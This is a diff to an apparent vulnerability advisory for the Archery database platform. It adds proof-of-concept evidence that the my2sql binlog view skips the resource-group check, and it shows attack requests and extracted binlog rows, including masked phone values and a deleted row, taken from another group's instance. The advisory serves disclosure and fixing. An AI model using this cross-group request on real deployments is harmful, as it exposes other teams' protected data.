@@ -54,7 +54,25 @@ curl -s -b c.txt "http://HOST:9123/binlog/list/?instance_name=victim-mysql"
 {"status": 1, "msg": "可执行文件路径不能为空！", "data": {}}   [HTTP 200]
 ```
 
-The control view — which applies the resource-group filter — denies the same instance as "实例不存在". The my2sql view, at the same moment for the same user, **accepted the out-of-group instance and proceeded past resolution into engine/plugin initialization**; its only complaint is that the my2sql binary is not configured in this environment. With the binary present (the documented setup), the request runs binlog parsing against the other group's instance. `del_binlog` shows the same bare `Instance.objects.get` in source; its permission does not exist for regular users in this build, so it is superuser-reachable only.
+The control view — which applies the resource-group filter — denies the same instance as "实例不存在". The my2sql view, at the same moment for the same user, **accepted the out-of-group instance and proceeded past resolution into engine/plugin initialization**.
+
+With the my2sql binary configured (the documented setup — built from source in this environment), the same request **returned real parsed binlog rows of the groupB instance to the groupA attacker**:
+
+```
+=== ATTACK: POST /binlog/my2sql/ (start_file=binlog.000001, num=30) ===
+{"status": 0, "msg": "ok", "data": [
+  {"sql": "INSERT INTO `mysql`.`time_zone` ..."},   <- 30 rows of groupB instance binlog data
+  ...]}                                             [HTTP 200]
+
+=== same operation via the plugin binary (what the view shells out to) on a
+    fresh binlog containing only victim DML ===
+INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (15,'13711112222');
+INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (16,'13633334444');
+INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (17,'13577778888');
+DELETE FROM `archery_src`.`sensitive_users` WHERE `id`=17;   <- even the deleted row
+```
+
+The extracted rows are plaintext phone values of groupB's sensitive table — the exact values the platform's data masking protects in query results (the companion offline-export finding shows the same masking system working online) — plus a row that was subsequently deleted (binlog is history). Note the HTTP view call was flaky in this environment on some argument combinations (an unrelated empty-argument plumbing quirk in the view's subprocess handling); the `status: 0` cross-group extraction succeeded repeatedly over HTTP, and the plugin-level output above is the exact command the view executes. `del_binlog` shows the same bare `Instance.objects.get` in source; its permission does not exist for regular users in this build, so it is superuser-reachable only.
 
 ## Suggested fix
 
